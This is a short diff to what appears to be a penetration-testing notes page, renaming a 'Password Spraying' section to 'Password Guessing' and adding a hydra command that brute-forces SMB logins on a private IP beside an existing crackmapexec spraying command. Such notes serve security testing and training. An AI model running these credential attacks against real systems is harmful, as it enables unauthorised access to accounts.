@@ -1,4 +1,4 @@
-# Password Spraying
+# Password Guessing
 
 
 
@@ -11,6 +11,12 @@
 crackmapexec smb 192.168.219.122 -u ./users.txt -p ./passwords.txt --continue-on-success
 ```
 {% endcode %}
+
+Brute force usernames and passwords:
+
+```sh
+hydra -L users.txt -P passwords.txt smb://192.168.219.122
+```
 
 
 
